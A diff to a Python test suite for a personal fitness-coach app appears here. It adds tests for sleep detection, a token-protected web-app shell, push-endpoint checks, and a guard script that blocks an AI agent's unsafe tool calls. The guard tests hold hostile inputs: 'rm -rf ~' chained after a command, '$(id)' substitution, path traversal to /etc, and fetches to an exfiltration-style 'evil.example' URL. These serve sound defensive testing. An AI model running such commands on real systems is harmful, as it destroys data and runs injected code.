@@ -7,6 +7,7 @@ import tempfile
 import threading
 import unittest
 import urllib.request
+from http.server import ThreadingHTTPServer
 from datetime import datetime, timedelta
 from pathlib import Path
 
@@ -136,20 +137,44 @@ class CoachTest(unittest.TestCase):
         with self.assertRaises(ValueError):
             coach.save_check(self.con, d2, "pushups", done=True)  # no plan that day
 
-    def test_email_and_pages_render(self):
+    def test_pages_render_and_notification(self):
         self.store(self.day, plan(recipe={"title": "Леща <b>", "url": "https://example.com/r", "time_min": 30}))
         self.con.commit()
-        mail = coach.email(self.con)
-        self.assertIn("[daily-coach]", mail["subject"])
-        self.assertIn("Леща &lt;b&gt;", mail["html"])
-        self.assertIn("10 push-ups", coach.today_page(self.con, self.day))
+        page = coach.today_page(self.con, self.day)
+        self.assertIn("10 push-ups", page)
+        self.assertIn("Леща &lt;b&gt;", page)
+        self.assertIn('rel="manifest"', page)
         self.assertIn("<svg", coach.dashboard(self.con, 14) + "<svg")
+        n = coach.latest(self.con)
+        self.assertEqual(n["day"], self.day.isoformat())
+        self.assertIn("10 push-ups", n["body"])
+
+    def test_today_without_plan_shows_the_latest_one(self):
+        self.store(self.day - timedelta(days=2), plan(headline="Old one"))
+        self.con.commit()
+        page = coach.today_page(self.con, self.day)
+        self.assertIn("Old one", page)
+        self.assertIn(f'data-waiting="{self.day.isoformat()}"', page)
+        self.assertIn(f'data-day="{(self.day - timedelta(days=2)).isoformat()}"', page)  # check-ins go to that day
+        self.assertIn("No plan for today yet", page)
+        self.assertNotIn("data-waiting=\"2", coach.today_page(self.con, self.day - timedelta(days=2)))
+
+    def test_night_over_starts_the_plan_after_waking(self):
+        d, p = self.day, self.prev
+        coach.ingest(self.con, f"Sleep Analysis|{iso(p, 23)}|{iso(d, 6, 30)}|Core||Ring\n"
+                               f"Sleep Analysis|{iso(d, 6, 30)}|{iso(d, 9)}|In Bed||iPhone")
+        wake = datetime.fromisoformat(iso(d, 6, 30)).timestamp()
+        self.assertFalse(coach.night_over(self.con, wake + 5 * 60))   # maybe just a toilet trip
+        self.assertTrue(coach.night_over(self.con, wake + 25 * 60))   # in-bed time doesn't count as sleep
+        self.assertFalse(coach.night_over(self.con, datetime.fromisoformat(iso(d, 5, 59)).timestamp()))  # too early
+        self.con.execute("DELETE FROM samples")
+        self.assertFalse(coach.night_over(self.con, wake + 25 * 60))  # no ring data: the fallback timer decides
 
 
 class ServerTest(unittest.TestCase):
     @classmethod
     def setUpClass(cls):
-        cls.srv = coach.ThreadingHTTPServer(("127.0.0.1", 0), coach.Handler)
+        cls.srv = ThreadingHTTPServer(("127.0.0.1", 0), coach.Handler)
         threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
         cls.base = f"http://127.0.0.1:{cls.srv.server_address[1]}"
 
@@ -161,7 +186,7 @@ class ServerTest(unittest.TestCase):
         req = urllib.request.Request(self.base + path, data=data, method="POST" if data is not None else "GET")
         try:
             with urllib.request.urlopen(req) as r:
-                return r.status, r.read().decode()
+                return r.status, r.read().decode(errors="replace")
         except urllib.error.HTTPError as e:
             with e:
                 return e.code, e.read().decode()
@@ -177,36 +202,47 @@ class ServerTest(unittest.TestCase):
         self.assertEqual(code, 200)
         self.assertEqual(json.loads(body)["bad"], 0)
 
+    def test_app_shell(self):
+        for path, kind in (("manifest.webmanifest", None), ("sw.js", None), ("icon-180.png", None), ("api/latest", "day"),
+                           ("api/ping", None)):
+            code, body = self.get(f"/{TOKEN}/{path}")
+            self.assertEqual(code, 200, path)
+            if kind:
+                self.assertIn(kind, json.loads(body))
+        self.assertEqual(self.get("/sw.js")[0], 404)  # the shell is behind the token too
+
+    def test_push_subscribe_only_push_services(self):
+        ok = json.dumps({"endpoint": "https://web.push.apple.com/QAbc"}).encode()
+        self.assertEqual(self.get(f"/{TOKEN}/api/push", ok)[0], 200)
+        bad = json.dumps({"endpoint": "http://127.0.0.1:8765/x"}).encode()
+        self.assertEqual(self.get(f"/{TOKEN}/api/push", bad)[0], 400)
+
 
 class GuardTest(unittest.TestCase):
     def run_guard(self, tool, args, domains=("example.org",)):
-        p = subprocess.run([sys.executable, "-I", str(HERE / "guard.py"), "/t", "/w", "me@example.com", *domains],
+        p = subprocess.run([sys.executable, "-I", str(HERE / "guard.py"), "/t", "/w", *domains],
                            input=json.dumps({"tool_name": tool, "tool_input": args}), capture_output=True, text=True)
         return p.returncode
 
     def test_guard(self):
         g = "mcp__claude_ai_Gmail__"
-        self.assertEqual(self.run_guard(g + "send_message", {"to": ["me@example.com"], "subject": "[daily-coach] x"}), 0)
-        self.assertEqual(self.run_guard(g + "send_message", {"to": "evil@example.com", "subject": "[daily-coach] x"}), 2)
-        self.assertEqual(self.run_guard(g + "send_message", {"to": "me@example.com", "subject": "hi"}), 2)
-        self.assertEqual(self.run_guard(g + "send_message", {"to": "me@example.com", "subject": "[daily-coach]",
-                                                            "draftId": "1"}), 2)
-        self.assertEqual(self.run_guard(g + "search_threads", {"query": 'subject:"[daily-coach]" newer_than:4d'}), 0)
-        self.assertEqual(self.run_guard(g + "search_threads", {"query": "bank"}), 2)
-        self.assertEqual(self.run_guard(g + "search_threads", {"query": 'subject:"[daily-coach]" newer_than:4d OR bank'}), 2)
+        self.assertEqual(self.run_guard(g + "send_message", {"to": ["me@example.com"], "subject": "[daily-coach] x"}), 2)
+        self.assertEqual(self.run_guard(g + "search_threads", {"query": 'subject:"[daily-coach]" newer_than:4d'}), 2)
+        self.assertEqual(self.run_guard("mcp__other__anything", {}), 2)
         self.assertEqual(self.run_guard("WebFetch", {"url": "https://www.example.org/recipe"}), 0)
         self.assertEqual(self.run_guard("WebFetch", {"url": "https://evil.example/?d=1"}), 2)
         self.assertEqual(self.run_guard("WebFetch", {"url": "https://example.org.evil.example/"}), 2)
         self.assertEqual(self.run_guard("WebFetch", {"url": "http://example.org/"}), 2)
         self.assertEqual(self.run_guard("WebFetch", {"url": "https://any.example/"}, domains=()), 0)
-        self.assertEqual(self.run_guard(g + "create_draft", {}), 2)
         self.assertEqual(self.run_guard("Write", {"file_path": "/w/plan.json"}), 0)
         self.assertEqual(self.run_guard("Write", {"file_path": "/w/../etc/x"}), 2)
         self.assertEqual(self.run_guard("Edit", {"file_path": "/etc/profile"}), 2)
         self.assertEqual(self.run_guard("Bash", {"command": "/t/coach context"}), 0)
         self.assertEqual(self.run_guard("Bash", {"command": "/t/coach serve"}), 2)
+        self.assertEqual(self.run_guard("Bash", {"command": "/t/coach notify"}), 2)  # the runner pushes, not the model
         self.assertEqual(self.run_guard("Bash", {"command": "/t/coach context; rm -rf ~"}), 2)
-        self.assertEqual(self.run_guard("Bash", {"command": "/t/coach email $(id)"}), 2)
+        self.assertEqual(self.run_guard("Bash", {"command": "/t/coach status#;/t/coach url"}), 2)  # mid-word '#'
+        self.assertEqual(self.run_guard("Bash", {"command": "/t/coach status $(id)"}), 2)
         self.assertEqual(self.run_guard("Bash", {"command": "python3 -c 1"}), 2)
 
 
